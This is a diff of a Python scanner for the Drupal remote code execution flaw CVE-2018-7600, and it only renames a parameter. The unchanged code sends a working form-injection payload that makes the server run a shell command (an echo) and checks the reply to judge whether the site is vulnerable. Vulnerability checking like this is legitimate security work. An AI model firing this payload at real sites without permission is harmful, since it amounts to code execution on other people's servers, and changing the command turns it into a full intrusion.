@@ -12,19 +12,19 @@ R = '\033[91m'
 W = '\033[0m'   
 
 
-def scan_cve_2018_7600(target):
-    target_url = f"{target}/user/register?element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax"
+def scan_cve_2018_7600(profile_url):
+    target_url = f"{profile_url}/user/register?element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax"
     headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36'}
     data = {"form_id": "user_register_form", "_drupal_ajax": "1", "mail[#post_render][]": "exec", "mail[#type]": "markup", "mail[#markup]": "echo 'haha'"}
 
-    print(f"{Y}[*] Testing if: {target} is vulnerable{W}")
+    print(f"{Y}[*] Testing if: {profile_url} is vulnerable{W}")
     
     try:
         response = requests.post(target_url, headers=headers, data=data, verify=False)
         if response.status_code == 200 and "haha" in response.text:
-            print(f"{R}[!] The target {target} is vulnerable to SA-CORE-2018-002 / CVE-2018-7600{W}")
+            print(f"{R}[!] The target {profile_url} is vulnerable to SA-CORE-2018-002 / CVE-2018-7600{W}")
         else:
-            print(f"{G}[*] - The target {target} is not vulnerable{W}")
+            print(f"{G}[*] - The target {profile_url} is not vulnerable{W}")
     except Exception as e:
         print(f"{R}[!] - Something went wrong: {str(e)}{W}")
 
